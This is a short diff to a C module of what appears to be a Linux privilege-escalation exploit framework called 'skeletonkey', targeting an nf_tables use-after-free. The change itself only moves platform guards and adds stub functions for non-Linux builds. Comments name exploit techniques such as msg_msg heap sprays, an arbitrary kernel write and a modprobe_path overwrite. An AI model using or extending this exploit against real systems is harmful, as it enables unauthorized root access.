@@ -57,16 +57,20 @@
 
 #include "skeletonkey_modules.h"
 #include "../../core/registry.h"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdbool.h>
+#include <unistd.h>
+
+#ifdef __linux__
+
 #include "../../core/kernel_range.h"
 #include "../../core/offsets.h"
 #include "../../core/finisher.h"
 
-#include <stdio.h>
-#include <stdlib.h>
 #include <stdint.h>
-#include <string.h>
-#include <stdbool.h>
-#include <unistd.h>
 #include <sched.h>
 #include <fcntl.h>
 #include <errno.h>
@@ -618,7 +622,6 @@ static long slabinfo_active(const char *slab)
  * Factored out so --full-chain can re-fire the trigger between
  * msg_msg sprays without duplicating the batch-building logic.
  * ------------------------------------------------------------------ */
-#ifdef __linux__
 static size_t build_trigger_batch(uint8_t *batch, size_t cap, uint32_t *seq)
 {
     (void)cap;
@@ -792,7 +795,6 @@ static int nft_arb_write(uintptr_t kaddr, const void *buf, size_t len, void *vct
     usleep(20 * 1000);
     return 0;
 }
-#endif /* __linux__ */
 
 /* ------------------------------------------------------------------
  * The exploit body.
@@ -825,7 +827,6 @@ static skeletonkey_result_t nf_tables_exploit(const struct skeletonkey_ctx *ctx)
         }
     }
 
-#ifdef __linux__
     /* --- --full-chain path --------------------------------------- *
      * Resolve offsets BEFORE doing anything destructive so we can
      * refuse cleanly on hosts where we have no modprobe_path. We run
@@ -906,7 +907,6 @@ static skeletonkey_result_t nf_tables_exploit(const struct skeletonkey_ctx *ctx)
         close(sock);
         return r;
     }
-#endif
 
     /* --- primitive-only path: fork-isolated trigger -------------- *
      * Fork: child enters userns+netns and fires the bug. If the
@@ -1069,6 +1069,28 @@ static skeletonkey_result_t nf_tables_exploit(const struct skeletonkey_ctx *ctx)
     }
     return SKELETONKEY_EXPLOIT_FAIL;
 }
+
+#else  /* !__linux__ */
+
+/* Non-Linux dev builds: nfnetlink + nf_tables UAF + userns is
+ * Linux-only kernel surface. Stub out cleanly so the module still
+ * registers and `--list` / `--detect-rules` work on macOS/BSD dev
+ * boxes — and so the top-level `make` actually completes there. */
+static skeletonkey_result_t nf_tables_detect(const struct skeletonkey_ctx *ctx)
+{
+    if (!ctx->json)
+        fprintf(stderr, "[i] nf_tables: Linux-only module "
+                "(nft_verdict_init UAF via nfnetlink) — not applicable here\n");
+    return SKELETONKEY_PRECOND_FAIL;
+}
+static skeletonkey_result_t nf_tables_exploit(const struct skeletonkey_ctx *ctx)
+{
+    (void)ctx;
+    fprintf(stderr, "[-] nf_tables: Linux-only module — cannot run here\n");
+    return SKELETONKEY_PRECOND_FAIL;
+}
+
+#endif /* __linux__ */
 
 /* ----- Embedded detection rules ----- */
 
